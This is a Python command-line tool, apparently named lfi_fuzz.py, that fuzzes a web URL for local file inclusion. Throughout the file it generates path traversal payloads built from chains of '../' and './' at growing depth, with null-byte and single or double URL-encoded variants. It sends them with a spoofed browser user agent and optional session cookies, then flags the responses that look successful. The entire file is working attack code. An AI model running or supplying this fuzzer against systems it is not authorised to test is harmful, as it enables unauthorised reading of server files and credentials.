import itertools
import requests
import getopt
import sys

from urllib.parse import quote_plus
from urllib.parse import urlparse

DDS = "../"
DS = "./"

USER_AGENT = {"User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}


def help():
    print("\t-u URL, --url=URL\tscan url")
    print("\t-p, --path=      \tdir or file")
    print("\t--depth=         \trecursion depth")
    print("\t--hcode=         \tHidden code separate [,]")
    print("\t--hsize=         \tHidden length content separate [,]")
    print("\t-c, --cookie     \tset cookie separate [,]")
    print("EXAMPLES: ")    
    print("\tlfi_fuzz.py -u http://example.com -p test")
    print("\tlfi_fuzz.py --url=http://example.com --path=test")
    print("\tlfi_fuzz.py --url=http://example.com --path=test --hcode=404,502")
    print("\tlfi_fuzz.py --url=http://example.com --path=test --hsize=612")
    print("\tlfi_fuzz.py -u http://example.com -p test --cookie session=test,path=/")


def good_code(code, text):
    good = "[+]"
    if code >= 400 and code <= 526:
        good = "[-]"
    return good + text


def lfi(url, payload, hcode=(), hsize=(), cookie=None, depth=5):
    dds = DDS
    ds = DS
    for _ in range(depth):
        payloads = [f"{dds}{payload}",
                    f"{payload}{dds}",
                    f"{ds}{payload}",
                    f"{payload}{ds}",
                    f"{dds}{payload}{dds}",
                    f"{ds}{payload}{ds}",
                    f"{dds}{ds}{payload}",
                    f"{ds}{dds}{payload}",
                    f"{payload}{dds}{ds}",
                    f"{payload}{ds}{dds}",
                    f"{dds}{payload}/",
                    f"{ds}{payload}/",
                    f"{payload}/{dds}",                    
                    f"{payload}/{ds}",
                    f"{dds}{payload}/{dds}",
                    f"{ds}{payload}/{ds}",
                    f"{dds}{ds}{payload}/",
                    f"{ds}{dds}{payload}/",
                    f"{payload}/{dds}{ds}",
                    f"{payload}/{ds}{dds}"]
        for p in payloads:
            resp = requests.get(f"{url}{p}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize:
                print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))                
            resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize:
                print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                
            # URLENCODE
            resp = requests.get(f"{url}{quote_plus(p)}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)            
            if resp.status_code not in hcode and len(resp.content) not in hsize:
            	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize:
            	print(good_code(resp.status_code, f"{quote_plus(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            	
            # DOUBLE URLENCODE
            resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize:
            	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))            	
            resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
            if resp.status_code not in hcode and len(resp.content) not in hsize:
            	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        dds += DDS
        ds += DS

    ds = DS
    for _ in range(depth):
        dds = DDS
        for _ in range(depth):
            payloads_two = [f"{ds}{payload}{dds}",
                            f"{dds}{payload}{ds}",                                                        
                            f"{dds}{ds}{payload}{ds}",
                            f"{ds}{dds}{payload}{ds}",
                            f"{dds}{ds}{payload}{dds}",
                            f"{ds}{dds}{payload}{dds}",
                            f"{ds}{payload}/{dds}",
                            f"{dds}{payload}/{ds}",                                                        
                            f"{dds}{ds}{payload}/{ds}",
                            f"{ds}{dds}{payload}/{ds}",
                            f"{dds}{ds}{payload}/{dds}",
                            f"{ds}{dds}{payload}/{dds}"]
            for p in payloads_two:                
                resp = requests.get(f"{url}{p}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))                    
                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                    print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # URLENCODE
                resp = requests.get(f"{url}{quote_plus(p)}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                	
                # DOUBLE URLENCODE
                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            dds += DDS
        ds += DS

    ds = DS
    for _ in range(depth):
        ds = DS
        for _ in range(depth):
            payloads_two = [f"{ds}{payload}{dds}",
                            f"{dds}{payload}{ds}",                                                        
                            f"{dds}{ds}{payload}{ds}",
                            f"{ds}{dds}{payload}{ds}",
                            f"{dds}{ds}{payload}{dds}",
                            f"{ds}{dds}{payload}{dds}",
                            f"{ds}{payload}/{dds}",
                            f"{dds}{payload}/{ds}",                                                        
                            f"{dds}{ds}{payload}/{ds}",
                            f"{ds}{dds}{payload}/{ds}",
                            f"{dds}{ds}{payload}/{dds}",
                            f"{ds}{dds}{payload}/{dds}"]
            for p in payloads_two:
                resp = requests.get(f"{url}{p}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                    print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # URLENCODE
                resp = requests.get(f"{url}{quote_plus(p)}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                	
                # DOUBLE URLENCODE
                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            ds += DS
        dds += DDS

    ds = DS
    for _ in range(depth):
        ds = DS
        for _ in range(depth):
            payloads_two = [f"{ds}{payload}{dds}",
                            f"{dds}{payload}{ds}",                                                        
                            f"{dds}{ds}{payload}{ds}",
                            f"{ds}{dds}{payload}{ds}",
                            f"{dds}{ds}{payload}{dds}",
                            f"{ds}{dds}{payload}{dds}",
                            f"{ds}{payload}/{dds}",
                            f"{dds}{payload}/{ds}",                                                        
                            f"{dds}{ds}{payload}/{ds}",
                            f"{ds}{dds}{payload}/{ds}",
                            f"{dds}{ds}{payload}/{dds}",
                            f"{ds}{dds}{payload}/{dds}"]
            for p in payloads_two:
                resp = requests.get(f"{url}{p}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                    print(good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))                    
                resp = requests.get(f"{url}{p}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                    print(good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                    
                # URLENCODE
                resp = requests.get(f"{url}{quote_plus(p)}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}{quote_plus(p)}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                	
                # DOUBLE URLENCODE
                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))} [code:{resp.status_code} size:{len(resp.content)}]"))
                resp = requests.get(f"{url}{quote_plus(quote_plus(p))}%00", headers=USER_AGENT, cookies=cookie, allow_redirects=False)
                if resp.status_code not in hcode and len(resp.content) not in hsize:
                	print(good_code(resp.status_code, f"{quote_plus(quote_plus(p))}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            ds += DS
        dds += DDS


def parse_url(url):
    u = ""
    d = urlparse(url)
    if d.scheme:
        if not d.path:
            u = f"{d.scheme}://{d.netloc}/"
        elif not d.query:
            u = f"{d.scheme}://{d.netloc}{d.path}"
        else:
            u = f"{d.scheme}://{d.netloc}{d.path}?{d.query}"
    return u


def parse_cookie(data):
    cookie = {}
    try:
        if data:
            for pair in data.split(","):
                key, value = pair.split("=")
                cookie[key] = value
        return cookie
    except ValueError as e:
        print(e)


def main():
    url = None
    path = None
    cookie = None
    hcode = ()
    hsize = ()
    depth = 5    
    try:
        try:
            opts, args = getopt.getopt(sys.argv[1:], "u:p:d:c:", ["url=", "path=", "depth=", "hcode=", "hsize=", "cookie="])
            for opt, arg in opts:            
                if opt in ("-u", "--url"):                    
                    url = arg
                elif opt in ("-p", "--path"):                    
                    path = arg
                elif opt in ("--depth"):                    
                    depth = int(arg)
                elif opt in ("--hcode"):                    
                    hcode = tuple(map(int, arg.split(",")))
                elif opt in ("--hsize"):                    
                    hsize = tuple(map(int, arg.split(",")))
                elif opt in ("-c", "--cookie"):                    
                    cookie = parse_cookie(arg)
                else:
                    help()
                    sys.exit(0)
        except getopt.GetoptError as err:
            help()
            sys.exit(0)
        if url is not None and path is not None:
            print("\n----------------")
            print("[!] LFI fuzzing")
            print("----------------\n")
            url = parse_url(url)
            print(url, path, cookie)
            lfi(url, path, hcode=hcode, hsize=hsize, cookie=cookie, depth=depth)
        else:
            help()
    except KeyboardInterrupt:
        sys.exit(0)
    except requests.ConnectionError as e:
        print(e)
        sys.exit(0)
    except requests.Timeout as e:
        print(e)
        sys.exit(0)
    except requests.RequestException as e:
        print(e)
        sys.exit(0)
    

if __name__ == "__main__":
    main()
